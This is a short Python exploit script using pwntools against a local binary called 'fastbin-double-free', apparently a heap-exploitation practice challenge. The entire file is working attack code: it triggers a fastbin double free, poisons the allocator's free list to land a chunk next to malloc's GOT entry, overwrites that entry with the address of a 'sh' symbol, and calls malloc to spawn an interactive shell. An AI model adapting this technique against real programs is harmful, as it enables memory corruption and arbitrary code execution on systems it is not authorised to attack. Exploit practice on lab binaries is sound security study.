#!/usr/bin/env python
from pwn import *
p = process('./fastbin-double-free')
elf = ELF('./fastbin-double-free')

def cmd(x):
	p.recvuntil('> ')
	p.sendline(x)

def malloc(i, size, s):
	cmd('1 {} {}\n{}'.format(str(i), str(size), s))

def free(i):
	cmd('2 {}'.format(str(i)))

sh = elf.symbols['sh']
malloc_got = elf.got['malloc']
gdb.attach(p)
malloc(0, 56, '\x00')
malloc(1, 56, '\x00')
free(0)
free(1)
free(0)
malloc(2, 56, p64(malloc_got - 6))
malloc(3, 56, '\x00')
malloc(4, 56, '\x00')
payload = 'sh' + '\x00' * 4 + p64(sh)
malloc(5, 56, payload.ljust(0x20, '\x00'))
malloc(6, malloc_got + 2, '\x00')
p.interactive()
